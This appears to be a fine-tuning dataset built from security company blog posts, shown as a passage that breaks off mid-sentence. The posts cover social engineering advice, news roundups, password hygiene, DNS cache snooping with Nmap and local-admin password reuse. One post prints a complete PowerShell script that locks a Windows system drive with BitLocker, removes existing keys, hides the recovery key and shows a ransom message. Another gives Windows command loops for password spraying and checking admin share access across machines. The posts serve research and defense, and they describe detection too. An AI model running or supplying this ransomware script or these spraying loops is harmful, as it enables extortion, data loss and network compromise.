Most criminals exploit human kindness, use distractions and questions or pretend to be in the service industry.\n\n9 Ways to Avoid Social Engineering\n\n1.) Be suspicious of any unsolicited messages or service personnel. \n\nIf the email/phone call/person looks like it is from a company you use, do your own research. Use a search engine to go to the real company\u2019s site, or a phone directory to find their phone number. If an unknown individual claims to be from a legitimate organization, try to verify his or her identity directly with the company. It is very simple to come up with a badge or false ID, so, don\u2019t be fooled by someone who \u201clooks\u201d legit. (We\u2019ve had customers so spun up and paranoid in the face of our penetration testing that even emails from employees in BHIS were double checked against known personnel - we applaud their security efforts!)\n\n2.) Slow down.\n\nPay attention to your surroundings. Scammers want you to act first and think later. If someone is conveying a sense of urgency or uses high-pressure sales tactics, be skeptical; never let their urgency influence your careful review.\n\n3.) Reject requests for help or offers of help.\n\nLegitimate companies and organizations do not contact you to provide help. If you did not specifically request assistance from the sender, consider any offer to 'help' restore credit scores, refinance a home, answer your question, check your printer, look for termites, etc., a scam. Similarly, if you receive a request for help from a charity or organization that you do not have a relationship with, delete it.\n\n4.) Delete or ignore any request for financial information or passwords. \n\nIf you get asked to reply to a message with personal information, it\u2019s a scam.\n\n5.) Don't provide information.\n\nDon't provide personal information or information about your organization, including its structure or networks, unless you are certain of a person's authority to have the information. Even mundane things can add fuel to the fire. Another good example of this is when you call a bank (or other important organization) and they verify your address by asking you, \"Do you still live at 123 Road Street, Anytown?\"  Ka-ching!\n\n6.) Don't send sensitive information over the Internet before checking a website's security. \n\nPay attention to the URL of a website. Malicious websites may look identical to a legitimate site, but the URL may use a variation in spelling or a different domain (e.g., .com vs. .net).\n\n7.) Don't overshare on social media. \n\nSharing too much information on social media can enable attackers to guess passwords or extract a person\u2019s or a company's confidential information through posts by employees. Plus it gives someone more ammunition to use when they attempt to get more personal details.  If I can find out someone is on maternity leave, I can manufacture all kinds of other details to make my social engineering attack seem even more legitimate.\n\n8.) Install and maintain anti-virus software, firewalls, and email filters to reduce some of this traffic online.\n\n9.) Be Careful Whom You Trust.\n\nThis seems really obvious, but after helping and seeing my co-workers do social engineering, I\u2019ve learned even more so that people are inherently trusting and helpful. They are ready to believe everything you tell them.  This speaks well to people, but is scary when I realize I\u2019m the same way. Practice kind helpfulness without automatically trusting someone completely. \n\nThese tips will work for both business and personal areas of life. The fact is, people need to be trained \u2013 according to digitalguardian.com PEOPLE are the weakest link in any security application.\n\nCompanies should employ, at minimum, a bi-annual training geared towards each user group (end-users, IT staff, managers, etc.) so that everyone is aware of the latest attacks. After all, these attacks aren\u2019t using \u201ctechnical\u201d employees, but any employees.  Hackers understand that the weakest link is the person with the least amount of education and training.\n\nEmployees should also be tested by having an outside party (like the awesome testers at BHIS) conduct a social engineering test. These kinds of tests help keep the employee on their toes and more likely to avoid the attacks in their business and personal lives.\n\nBe safe out there!\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Lawrence's List 061316\"\nTaxonomies: \"News, Cisco, Facebook, good time, Google vs. Oracle, Lawrence's List, Linux, Tor\"\nCreation Date: \"Fri, 03 Jun 2016 15:33:10 +0000\"\n\nEditor\u2019s Note: We\u2019ll feature Lawrence\u2019s List every week.  It will include interesting things he\u2019s come across during the week as he\u2019s an avid consumer of internet garbage and follows a lot of mailing lists, forums, and news sites. Some of it may be narrow in terms of who may be interested (LKML) but, occasionally there\u2019s a gem in there. Some list items will be big news, some small news, some dumb news, some so esoteric it\u2019s hard to imagine anyone would care. Who knows, it might stick.\n\nThe Tor Project has announced release of Tor Browser series 6.0 which includes upgrades to allow the Tor Browser to work with version 45-ESR of Firefox, which should make HTML5 and YouTube perform better. Other improvements include code signing for OS X, removal of SHA1 certificate support, and a fix for a potential DLL hijacking vulnerability in Windows.\n\nhttps://blog.torproject.org/blog/tor-browser-60-released\n\nLinus Torvalds released a pre patch for Linux 4.7 rc-1 containing a swath of improvements coming in from over 1400 authors. A noteworthy new feature coming up in the 4.7 release is LoadPin. LoadPin ensures that all kernel modules are loaded from a trusted file system and is Chrome OSs solution to kernel module signing. (Consider the possibility of only allowing your kernel to load modules from write only media, like a CD-Rom). There is a boot time option to unset the feature, so physical access still means access.\n\nhttps://lkml.org/lkml/2016/3/28/405\n\nThe court proceedings between Google and Oracle came to a temporary close on the 26th when a jury unanimously found that Google\u2019s use of the Java API fell under \u201cfair use.\u201d This did not directly affect the circuit court\u2019s decision that APIs are copyrightable. The Electronic Frontier Foundation feels that the circuit court's ruling (which overthrew a previous ruling on the issue) about copyright and APIs is in error. While this is a win for Google in the short term Oracle has announced that they will be appealing.\n\nhttps://www.eff.org/deeplinks/2016/05/eff-applauds-jury-verdict-favor-fair-use-oracle-v-google\n\nhttps://www.eff.org/cases/oracle-v-google\n\nhttps://www.theguardian.com/technology/2016/may/31/google-fair-use-victory-oracle-software-androids\n\nCisco has issued a warning that it believes the \u2018ping of death\u2019, an IPv6 DoS vulnerability which can cause routing equipment to stop routing IPv6 traffic, may be a problem for everyone.\n\nhttps://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20160525-ipv6\n\nBIAS notice: I don\u2019t trust advertising to begin with. I found this article a fun read, it follows a diversion down the rabbit hole of an interesting (and sneaky) ad found on Facebook.\n\nhttps://medium.com/@hunchly/bait-and-switch-the-failure-of-facebook-advertising-an-osint-investigation-37d693b2a858#.asvbapzg5\n\nA while back I was working on a front end for a project and posed the question to some of my colleagues \u201cHow would you rate browser local storage in terms of security?\u201d This week the PortSwigger blog had an article that tackled that question.\n\nhttp://blog.portswigger.net/2016/05/web-storage-lesser-evil-for-session.html\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"10 Ways to Protect Your Online Digital Life\"\nTaxonomies: \"Author, General InfoSec Tips & Tricks, InfoSec 101, Joff Thyer, backups, credit cards, credit freeze, dedicated browser, digital life, online banking, online life, passphrases, passwords, physical copies, privacy, protecting yourself\"\nCreation Date: \"Mon, 06 Jun 2016 17:15:09 +0000\"\nJoff Thyer // \n\nRecently I have been thinking about online challenges I encounter in daily life.   As I thought about it, I realized that many of these items I practice on a regular basis.  While it feels pretty intuitive to me to follow these guidelines, it may not feel as mainstream to many others so I thought I would write some things down.   Adopt a mindset that there will be a business that gets compromised and that you have provided some of your data to in the past.  How are you going to mitigate the risk to your own personally identifiable information?   What are you doing proactively before a breach occurs, and how will you protect yourself when you learn that your own data is at risk?    Below is a suggestion list of good digital hygiene items that I came up with.\n\n1. Use long pass-phrases.In the information security community, we talk about this all the time.  Our line of thinking is that a pass-phrase (ie: unique sentence) is easier to remember than a complex password.   On the subject of length, longer than 16 characters make for good strength.  One example might be:  \u201cWeLoveDriving2TheMountains4FunTimesAndAdventures!\u201d.   Shorter length passwords are subject to both brute force and dictionary attacks.   In addition to pre-computed encrypted password representations, there exist very large dictionaries of common passwords, and plenty of computing cycles to perform offline attacks.   It is entirely feasible that any organization you are doing online business with will have their encrypted password database stolen (ex-filtrated) at some point in time.   Your choice to use a very long passphrase is going to make plaintext recovery of your specific password computationally challenging.\n\n2. Use an online password vaulting application with two-factor authentication.There are many good choices in this arena today.  The beautiful thing about a password vaulting application is that remembering your own master passphrase (key) is the main responsibility.  For passphrases/passwords to all applications within the vault, you can choose to use the maximum length, complexity, and pseudo-randomness that the application permits, and avoid reusing passphrases entirely.  Sadly with some applications the passphrase length, and complexity is limited.   The downside of a password vaulting approach is that all your eggs are indeed in one basket so you better choose an application vendor that is time tested, highly reputable, and of course has a very secure approach to managing this critical data.   In addition to choosing your strong primary passphrase to the vault, I would strongly advise using a second-factor authentication to access the vault.\n\n3. Use a dedicated computer and/or dedicated web browser for financial transactions.Your browser gets significantly polluted and potentially compromised from generalized web surfing.   You have all seen persistent cookies which present targeted advertising in different browser tabs.   Tracking and profiling using cookie information are very common these days.   A cross-site request forgery (CSRF) attack could easily happen and you would never know what hit you until it's too late.   A CSRF attack involves exploiting an existing application by manipulating the trust relationship that your browser has in one browser tab from a separate browser tab or window.   Trusted browser cookie data is usually manipulated in order to perform the attack.\n\nYou know which banking, and other financial sites which are important to you and that you use to manage your own sensitive data on a regular basis.   At a minimum, dedicate a web browser to perform those actions, and make sure that the browser never visits any other website other than what you have selected to be within the inner circle of trust.   Clear all browser history and cookie data upon exit every single time from that browser.   Even better if you can dedicate a computer (or virtual machine) entirely to this task.   It takes some discipline but it is worthwhile to pursue.\n\n4. Guard your privacy as much as possible.Let\u2019s admit that many of us use social media.   How much information are you sharing about yourself in the process?   Think for a moment how much information you wish to share and only go that far.   Know that once you sign-up for social media, anything you provide is potentially public information.   Understand and control your public media presence.  Only share information that you are comfortable standing in the middle of a busy street and yelling the same information aloud.\n\n5. Don\u2019t install risky applications with known vulnerabilities.While the operating system landscape has slowly evolved and improved over the years to automate vulnerability remediation and patch management, the application landscape is quite different.   There are many known vulnerabilities in applications over time.  In particular, products like Java, Adobe readers, and flash media software have had a string of known vulnerabilities.   Think about whether you really need to use this software?   Does it belong on your computer at all, and can you live without it?\n\n6. Use full disk/flash media encryption on mobile devices.Your mobile computing device might get lost or stolen at some point in your travels.  What data is contained on that device, and what prevents the thief from mercilessly pillaging the information from the device?   Make sure that you have an idle timeout and screen lock configured on the device.  Make sure the pass-phrase is strong, and ensure that data is only acceptable after your credentials have been successfully entered.\n\n7. Always use credit cards when traveling and monitor accounts closely.This one is directed more towards the road warriors.   Here in the U.S., the danger of compromising your debit card means potentially losing your banking funds and not being able to recover them.  As sad as it is, the larger credit card companies have become very good at data analytics and identifying out of character transactions.  They will shut your account down very quickly if they suspect fraud.  Those of us who travel frequently know this all too well because invariably it becomes a false positive situation for us.   But more to the point, you are not putting your personal banking funds directly at risk by using credit and recovery from a fraudulently used credit card has become fairly routine.\n\nA useful addendum to this idea is to use Paypal for online purchases.  It is a well tested and secure transaction service that affords a nice level of protection for your online experience.\n\n8. Restrict access to your credit report/credit freezeWhenever you apply for a new loan of some sort, your credit scores will be checked with the major agencies.   There is very little reason to allow your credit scores to be checked indiscriminately and since there have been numerous personal identity compromises, the credit agencies do allow you to freeze your credit line checks not allowing the credit line check to proceed without your authorization.   In many U.S. states, this is now backed by law.\n\n9. Backup your dataHow would you recover if you became a victim of ransomware?  This type of malware usually results in your data getting encrypted and then results in a demand for payment to recover an encryption key and decrypt said data.   From a personal user perspective, there are many backup services available which will make sure your secure data is stored in the cloud.   Rather than pay the ransom, I suspect most would prefer to format and start over.\n\n10. Make a copy of key account numbers, and store it in a safe or other physically secure location.When all else fails, sometimes you just need the paper.   I would suggest having a small fireproof/waterproof safe at home in which you can store valuable information such as birth certificates, passports, backup media (if you like), and more to the point some printed information that gives you some recovery mechanisms should a real disaster occur that renders your digital devices worthless.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Wide-Spread Local Admin Testing\"\nTaxonomies: \"Author, Brian Fehrman, External/Internal, Password Spray, Red Team, domain admin, local admin testing, password, password spraying\"\nCreation Date: \"Mon, 13 Jun 2016 16:14:53 +0000\"\nBrian Fehrman //\n\nIn our experience, we see many Windows environments in which the local Administrator password is the same for many machines. We refer to this as Wide-Spread Local Administrator Re-use. This type of configuration is extremely advantageous to an attacker. Once the attacker has the local Administrator password for one computer, they can usually pivot to other computers in the environment with ease and begin retrieving other user credentials and potentially sensitive information on the systems. In some cases, only the Administrator hash is needed to pivot with that account.\nWe typically start with a non-privileged user when performing pivot engagements and attempt to escalate privileges to that of a Domain Administrator. On a recent engagement, a lot of the normal escalation techniques didn\u2019t work out. Beau Bullock (@dafthack) hopped on to aid me (as he so often does) and we put our heads together on this. \nOne of the escalation methods that I had already tried was password spraying. For those that don\u2019t know, the concept of this method is that you try a few common passwords against a large set of users. The advantages that this technique has over brute-force login attempts is that you are less likely to lockout accounts and are very likely to find a valid password for at least one user. \nDuring this engagement, the network was small and only one valid set of credentials was found. The user did not have special privileges anywhere but they were able to access an internal SharePoint-type server that our user could not access.\nWe browsed around the SharePoint server and were able to find a document that detailed how new user-machines should be setup. In this document, it told what the local Administrator password should be for every new workstation. It did not talk about changing it. Re-read that and give it a moment to digest. As you can imagine, we were thrilled!\nAlmost immediately, we tried the password on our machine. Sadly, however, it did not work. It had to be valid somewhere though...and we needed a way to check. Metasploit contains modules that allow for you to do this. The modules require a session to be established on your internal computer first. We could have established a session but we wanted an easier way. Thinking back to the password spraying attack, it hit us; that command could just be modified to test for wide-spread local admin use.\nThe following is a typical password spraying command:\n@FOR /F %p in (pass.txt) DO @FOR /F %n in (users.txt) \nDO @net use \\\\LOGONSERVER\\IPC$ /user:domain\\%n %p 1>NUL 2>&1 && \n@echo [*] %n:%p && @net use /delete \\\\LOGONSERVER\\IPC$ > NUL\nEffectively, it takes a password out of the pass.txt file and pairs it up with each user in the user.txt file. It then attempts to authenticate each user:pass combo against the domain\u2019s LOGONSERVER by issuing a net use command as that user.\nHow do we modify this for testing for wide-spread local admin? Simple. First, we need to get a list of systems in the environment. The following command can be used for this task:\nnet view /domain > systems.txt\nNext, we need to modify our loop a bit. For this check, we assume that we have a valid set of credentials. We need to iterate over the systems rather than users and passwords. We modified the password spraying command to be as follows:\n@FOR /F %s in (systems.txt) DO @net use \\\\%s\\C$ /.\\Administrator \nAdminPass 1>NUL 2>&1 && @echo %s>>admin_access.txt && @net use \n/delete \\\\%s\\C$ > NUL\nThe concept of the command is the same as before but attempts to access the C$ share on each machine rather than the IPC$ share on the domain\u2019s logon server. Anywhere that this command succeeds, we know that the Administrator credential is valid. The list of systems on which the account is valid are output to a file named admin_access.txt. You could then start grabbing up credentials off each of those machines using one of many methods. In our case, this showed us that the credential we found was valid for almost 200 machines on the network and we were quickly on our way to DA.\nIn conclusion, Wide-Spread Local Administrator accounts continue to be a common problem in many networks. There are existing methods to test for this once you have a valid set of credentials. Here, we have described an easy way that you can do this by using built-in tools on the Windows command shell.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Are you Snoopable?!\"\nTaxonomies: \"Blue Team, DNS, DNS cache snooping, Nmap, Snooping\"\nCreation Date: \"Wed, 08 Jun 2016 15:05:18 +0000\"\nRick Wisser //\n\nAll right, you\u2019ve taken all the precautions related to your network. You have lockout controls in place, you use awesome password policies (20 characters with uppercase, lowercase, special characters, and wingdings\u2026. ) Two factor is everywhere, web apps are locked down, cross-site-scripting and SQL injection are not viable. You are feeling good about the security of your infrastructure.\n\nSo why may you still be worried (other than you are a systems admin)? It seems like Social Engineering is becoming the new attack vector these days.  Why?  Because it is easier to find out information on specific people in your organization and target them for valuable information as opposed to getting it from the network. Eventually, everyone will have networks so secure that you don\u2019t need to worry about them any more (Right \u263a)\u2026 Here at BHIS, we could only hope so, but in the meantime, we will keep pumping out blog posts and helping find the vulnerabilities.\n\nYou may wonder where I am going with this. Well, sometimes we overlook little things like Domain Name Server (DNS) Cache Snooping.\n\nMany non-technical readers may wonder what the heck a DNS is and what it does?\n\nWithout getting too technical, a DNS is utilized to translate human-readable format to the machine language, in this case, the IP address of the system you are trying to reach. For example, if you type www.peanuts.com into your browser the request will be sent to a DNS server that searches for the record (IP) that goes with www.peanuts.com. The record for this example would translate to an IP address of 54.201.160.175. You can see how typing in an easy to remember name is easier than typing in the IP address. Many have used the analogy of a phone book for correlating the naming convention with the IP address of the system.\n\nSeveral organizations have and manage their own Domain Name Server(s) depending on the number of IPs that they have and if they are frequently changing machines, hostnames or IP addresses.  It is easier to manage changes to the DNS locally than having to fax or fill out paperwork to a third party to make changes. If your organization manages its own DNS then this blog would be intended for you.\n\nDNS uses recursive and non-recursive lookups depending if the site has been cached (stored locally) or not.\n\nRecursive \u2013 This type of lookup is utilized if the website is not known by your DNS. The Domain Naming Server will have to poll other servers to get the information to resolve the website name to an IP address and route your traffic correctly\n\nNon-Recursive \u2013 This type of lookup is stored in the cache of your Domain Name Server so it is easily accessed without going out and polling other servers, as it would have to do with a Recursive lookup\n\nDNS cache snooping is used by attackers to gather information about your organization\u2019s browsing habits. This information can be utilized to plan an attack against your company, such as email phishing or spearfishing campaigns. This can also disclose sensitive information such as financial institutions that have been visited recently or other sensitive websites that a company might not want to be public knowledge.\n\nDepending on how your DNS server(s) is configured and sitting on the network may determine the level of risk. For example, if you are sitting inside your network, your Domain Name Server may allow caching of websites for people that are on the local network and not for those external to your network. It is always recommend testing from outside of your network to determine if cache snooping is valid from public spaces. Although cache snooping may be realized within your network, the risk would be lower since an attacker would have to have access from within your network before they are able to snoop.\n\n My Side. Your Side \u2013 Inside, Outside \n\nA simple test is to use Nmap with a dns-snoop-cache.nse script. Below I have run the script to on the Google DNS at 8.8.8.8 to validate that it is caching websites. By default the Nmap command utilized is a non-recursive lookup, therefore the output relates to those sites that are cached on the server.\n\n Nmap Output of \u2013script dns-cache-snoop.nse for 8.8.8.8 \n\nAs you can see from the output above there are 61 of 100 of the domains cached at Googles 8.8.8.8 DNS.\n\nI should also point out that Nmap uses a pre-configured set of the top 100 domains to check against for determining if they are cached or not. You can supply the list of domains if you would like and thus make it more specific to your organization. By utilizing an argument along with the Nmap command to specify the domains you would like to check. The argument is:\n\n \u2018dns-cache-snoop.domains={host1,host2,host3,etc}\u2019\n\nThe screenshot below demonstrates an output of using specific domains or hosts.\n\n Supplying Specific Domains \n\nIf you want to find out which sites have been visited recently you can use the argument \u2018dns-cache-snoop.mode=timed\u2019 this can only run reliably once since it also caches to the server.\n\n Using Timing Argument with Nmap \n\nYou can see that the most recent sites visited are a little different than when the Nmap command was run without the \u2018dns-cache-snoop.mode=timed\u2019 argument was included.\n\nDepending on how your DNS server is set-up you may not get any information. It also may depend on if your organization is blocking certain domains. Many organizations will block the top 100 domains since a majority of them are related to social or shopping sites. If this is the case you might want to check for specific domains such as wellfargo.com or chase.com. You can also go to a specific site on your network and then check to see if you DNS has cached it.\n\nThere are other vulnerabilities related to DNS, such as cache poisoning, Distributed Denial of Service (DDoS) or DNS amplification attacks. I will save these for future discussion since for many DNS is not as exciting as things like cute kitty videos that we all love.\n\nHappy Snooping!\n\nBonus Points \u2013 What show is the image of in this blog and what is the character's name? Tweet us @BHinfoSecurity if you know the answer!\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Lawrence's List 061016\"\nTaxonomies: \"News, bad passwords, bsides, CII, CII best practice badge, CONs, domain typo squatting, infosec cons, IoT, Lawrence's List, password fails, passwords, reverse engineering\"\nCreation Date: \"Fri, 10 Jun 2016 18:04:19 +0000\"\nLawrence Hoffman //\n\nIt\u2019s been one of those crazy busy weeks. I always feel like I didn\u2019t get enough time to read articles, surf Reddit, and attempt to keep up with LKML (I know this can\u2019t be done, but what can I say? I have a problem.) Also, the week ends with BSidesMSP. Which is awesome.\n\nIf you\u2019re reading this on Friday or Saturday (June, 10/11), come chat with @GailMenius and I down at the BHIS / OCM booth.\n\nI am super excited to see what security stories the IoT era will bring. I feel like this article is another small preview, imagine this kind of security failure in every important device you own.\n\nhttps://www.pentestpartners.com/blog/hacking-the-mitsubishi-outlander-phev-hybrid-suv/\n\nMark Zuckerberg momentarily lost control of two of his accounts this week due to weak passwords. Not much more to say about that.\n\nhttp://www.theregister.co.uk/2016/06/06/facebook_zuckerberg_social_media_accnt_pwnage/\n\nDomain typo squatting is an old trick. This article takes that to a new realm. The author had the bright idea to typo squat a package manager. I\u2019ll admit this was much more successful than I\u2019d suspected it would be. I\u2019ll also admit that I\u2019ve been nervously double checking package names since reading this article.\n\nhttp://incolumitas.com/2016/06/08/typosquatting-package-managers/\n\nWhile I don\u2019t reverse engineer hardware myself, or even have access to the tools for that matter, I always like to read about hardware reversing efforts. There\u2019s been a good series going since april over at jcjc-dev.com since April. The fourth part in the series was posted on Wednesday this week, it has made for some pretty informative and reading.\n\nhttp://jcjc-dev.com/2016/04/08/reversing-huawei-router-1-find-uart/\n\nThe Core Infrastructure Initiative (CII) has announced a best practices badge for security. The badge is intended to give developers a checklist of lessons learned the hard way by other Free/Libre and Open Source Software (FLOSS) projects. By meeting the checklist of criteria, not only is a project earning an endorsement of sorts, but also creating climate of expected attention to good security practices within FLOSS software.\n\nhttps://www.coreinfrastructure.org/news/announcements/2016/05/free-badge-program-signals-what-open-source-projects-meet-criteria\n\nI\u2019m wrapping this up at @BSidesMSP, if you\u2019re here feel free to drop by the BHIS booth and see us. \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Bitlocker Ransomware: Using BitLocker for Nefarious Reasons\"\nTaxonomies: \"InfoSec 301, Robert Schwass, bitlocker, hacking, Microsoft, ransomeware, Windows 10\"\nCreation Date: \"Wed, 15 Jun 2016 15:52:16 +0000\"\nEditor's Note: We're excited to publish our first guest post!  If you'd like to guest post on our blog DM us on Twitter, or use our contact form to contact us for details.\n_________\n \nRobert Schwass //\n\nI don\u2019t know how I got there, but a few days ago I found myself looking at an article on the new \u201cfeatures\u201d that Microsoft has implemented for BitLocker on Windows 10.  The most noteworthy of the features that really captured my attention was that there is a new group policy for configuring pre-boot recovery. I know that doesn\u2019t sound all that exciting by itself, but if you combine that with another feature introduced in Windows 8 where the OS drive can now be encrypted without a TPM (Trusted Platform Module) and even without a USB drive; you have a recipe for evil.\nAfter presenting this discovery to BHIS they had questions of their own. More research revealed that you can strip away the recovery keys and passwords on a protected drive and replace them without having to know what those passwords or keys were to begin with.\n\nBitLocker Based Ransomware!\nUsing the BitLocker Cmdlets for Powershell I was able to create a script that encrypts the System drive, with a custom recovery message. The following script locks the drive and throws away the recovery key, by placing it on the drive being encrypted. The only way to unlock the drive is with the password.\nIf the drive is already protected with BitLocker the script strips out all of the passwords and recovery keys and replaces them.\nNote: The script requires local administrative rights.\n#BitLocker for Ransom\n\n#Is BitLocker already enabled on the system drive\n\n$Check = (get-BitLockervolume -mountpoint $ENV:SystemDrive)\n\n$Status = $Check.ProtectionStatus\n\nif($Status -eq 'Off'){echo 'BitLocker NOT Enabled on System Drive'}\n\nif($Status -eq 'On'){echo 'BitLocker IS Enabled on System Drive'}\n\n#Set registry first\n\nREG ADD HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE /v EnableBDEWithNoTPM \n/t REG_DWORD /d 1 /f\n\nREG ADD HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE /v UseAdvancedStartup \n/t REG_DWORD /d 1 /f\n\nREG ADD HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE /v UseTPM /t REG_DWORD \n/d 2 /f\n\nREG ADD HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE /v UseTPMKey /t \nREG_DWORD /d 2 /f\n\nREG ADD HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE /v UseTPMKeyPIN /t \nREG_DWORD /d 2 /f\n\n#Change the recovery message to meet your needs. In my example I \nput a fake website where the victim can come and pay for their \npassword\n\nREG ADD HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE /v RecoveryKeyMessage \n/t REG_SZ /d 'please Visit my hacker site https://yourscrewed.hahaha \nto give me money' /f\n\nREG ADD HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE /V \nRecoveryKeyMessageSource /t REG_DWORD /d 2 /f\n\nREG ADD HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE /v UseTPMPIN /t \nREG_DWORD /d 2 /f\n\n#Use a Strong Password Here!\n\n$PlainPassword = \"P@ssw0rd\"\n\n$SecurePassword = $PlainPassword | ConvertTo-SecureString \n-AsPlainText -Force\n\nif($Status -eq 'Off'){\n\n#Enable BitLocker, Encrypt the used space on the C: drive\n\nenable-BitLocker -EncryptionMethod Aes256 -password $securepassword \n-mountpoint $ENV:SystemDrive  -PasswordProtector -skiphardwaretest \n-UsedSpaceOnly\n\n#To use the Custom Recovery Screen, there must be a recovery key \ncreated. I dont want to use the recovery key, so I put it on the \nencrypted C: drive so it is inaccessible.\n\nadd-BitLockerkeyprotector -mountpoint $ENV:SystemDrive \n-RecoveryKeyProtector -RecoveryKeyPath $ENV:SystemDrive\\\n\n#Uncomment to restart the Computer ASAP so that the damage is done \nbefore the user can undo it. I dont do this by default\n\n#restart-computer\n\n}\n\n#If BitLocker is already enabled on the systemd drive. The following \nwill execute, removing all passwords and recovery keys. Then adding \nmy own passwords and keys just like before.\n\nif ($Status -eq 'On'){\n\n#Strip all Passwords and Recovery keys (Not yet Tested with TPM)\n\n$IDS = $check.KeyProtector.KeyProtectorID\n\nforeach($ID in $IDS){\n\nRemove-BitLockerKeyProtector -Mountpoint $ENV:SystemDrive \n-KeyProtectorID $ID\n\n}\n\nadd-BitLockerkeyprotector -mountpoint $ENV:SystemDrive \n-PasswordProtector -Password $securepassword\n\nadd-BitLockerkeyprotector -mountpoint $ENV:SystemDrive \n-RecoveryKeyProtector -RecoveryKeyPath $ENV:SystemDrive\\\n\nResume-BitLocker -MountPoint $ENV:SystemDrive\n\n}\n##ENDSCRIPT##\nThe script executes quickly and the next time  the computer reboots, the user is hit with the usual BitLocker password prompt. Pressing the ESC key they can see the recovery options. You will see the custom recovery message that was put into the system\u2019s registry.\n\nAnd there you have it. Ransomware using Microsoft built in features and tools. I will not go into detail on how to weaponize this into a payload or force a prompt for elevation, there are plenty of blog posts and videos on the internet that already have that information.\nThere is a line available in the script that will restart the computer as soon as the script executes, this prevents the user from halting the locking process. I leave the restart option commented out by default as I think most users will ignore the small notification that warns them the drive is being encrypted. In my experience this notification only appears if the drive was not encrypted before the script ran.\n\nResearch Caveats\nI did all of this research on a workgroup fresh install of Windows 10 Evaluation. There is nothing that suggests to me that doing this on a domain joined system would not have similar results as BitLocker reads the current registry settings, not the ones loaded at boot time.\nDefenses - Be Prepared to Lose Everything\nBackup your personal data. If everything you need is in the cloud, on an external device or some other remote storage, you will be fine.\nDefenses - How do I Identify this is happening?\nDetection With Powershell or CMD\nThis is simple to detect if you are looking for it. You can use the same tools that enabled BitLocker to detect if it is running. There are ways within Windows to run a script at Shutdown/Restart, or even have a script run at a regular interval that queries if BitLocker is on and what/where the recovery keys and methods are. Compare what the current recovery key is to what you know that key should be, if the key is something different then reset the keys, or send an alert to the helpdesk, etc.\nThe manage-bde.exe tool allows you to do similar tasks as the Powershell CMDlets if you are more comfortable with cmd and batch scripts.\nDetection With Event Logs\nBitLocker events do log to the source Applications and Services \u2192 Microsoft \u2192 Windows \u2192 BitLocker-API \u2192 Management  by default. Event 775 occurs when a Key Protector is created. Event 768 occurs when encryption starts on a drive ( at least in my testing the c: drive). There are other events in there 796, and 780 that occurred during my experiment. Setting up alerts on these logs is a great way to detect if BitLocker is being turned on/off or the keys are being changed.\nAlso avoid giving attackers administrative privileges in the first place. Use common malware defenses; scanning email attachments, user awareness training, etc.\nPersonally I think Microsoft made a big mistake allowing BitLocker to be configured without forcing the use of USB or TPM, they also really missed the security mark by not making you reauthenticate passwords and recovery keys before changing them.\nI reached out to the Microsoft Security Response Center expressing my concerns with the current implementation of BitLocker and they were so kind as to respond.\nMicrosoft MSRC Rep.\u201cHello,\nThank you for contacting the Microsoft Security Response Center (MSRC). To use BitLocker in this way the malicious person would need to have already compromised the machine and would have Administrator Privilege, in that case they could do whatever they wanted to the system, just as any local administrator could.\nRegards,\nMSRC\u201d\nI replied back.\u201cThere are many security technologies in place today that even though my system is compromised the attacker still has to authenticate to change the password. Is there a way I can implement BitLocker in such a way to force the administrator to authenticate the Recovery Key before changing it?\nIs Microsoft considering adding functionality like this to BitLocker in the future?\u201d\nMicrosoft Responded.\u201cThank you for contacting the Microsoft Security Response Center (MSRC). This would not be a security vulnerability and is likely by design. You can submit the suggestion to the Windows team using the Windows Feedback app in Windows 10.\u201d\nMicrosoft does take security seriously, I just need to find the right way to release this information. I will follow the suggestion from Microsoft from inside a virtual machine, I don't like to tie my operating system to my Microsoft account, call me old fashioned.\n\n_____\nTo grab a copy/paste version of the code visit Robert's GitHub here.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Lawrence's List 061716\"\nTaxonomies: \"News, everything on the internet is true, Guccifer 2.0, hype it's all hype, Julian Assange, Management Engine, Net Neutrality, Photomniner\"\nCreation Date: \"Fri, 17 Jun 2016 15:00:20 +0000\"\nLawrence Hoffman //\n\nCertain Intel chips come with what\u2019s called a \u201cManagement Engine\u201d or ME. This is an actual physical subsystem which implements Intel\u2019s Active Management Technology (AMT.) Why is it on a security blog? Because it has full control over everything your machine does, uses security by obscurity, and if infected would be totally undetectable, and totally unfixable. http://boingboing.net/2016/06/15/intel-x86-processors-ship-with.html\n\nNet neutrality. For those who haven\u2019t been following, let me give a short overview. ISPs would like to sell you access to the internet piecemeal. That is you would no longer pay one fee for equal access to all websites. Rather you\u2019d purchase access much the same way as we purchase access to cable TV. Facebook and Twitter would be one fee, using Google search another fee, etc. Furthermore, they\u2019d like to be able to prioritize delivery. For example, assume you owned an ISP, and you wanted to start an on demand video service, how to get new adopters? Make the current video services deliver so slowly that you become the only watchable option. Thankfully the FCC's ruling that the internet is a medium of communications was upheld by the courts this week. This isn\u2019t over though, ISPs are claiming that not being allowed to block or handicap sites is an infringement of their freedom of speech, and they\u2019ll likely continue this battle for as long as they can.\n\nhttp://arstechnica.com/tech-policy/2016/06/net-neutrality-and-title-ii-win-in-court-as-isps-lose-case-against-fcc/\n\nThis grabbed my attention. The worm, dubbed \u201cPhotominer,\u201d is pretty neat in concept and design. Here\u2019s the plan:\n\nBrute force weak ftp passwords.\n\nInfect websites on those ftp servers with malware that infects machines of people who visit the site.\n\nPivot within the victim's environment using SMB, dropping as many copies as possible.\n\nSet up fake Wi-Fi access points that infect other machines when they try to connect.\n\nUse all the infected machines to mine Monero (a crypto currency.)\n\nProfit.\n\nhttps://www.guardicore.com/2016/06/the-photominer-campaign/\n\nHype warning: You\u2019re reading stuff on the internet, it may not be true! \n\nI\u2019ve read enough articles on this that I\u2019m getting turned around as to who did what. At the beginning of the week we heard that Julian Assange is planning another dump of information on Hillary Clinton which he believes will lead to her indictment 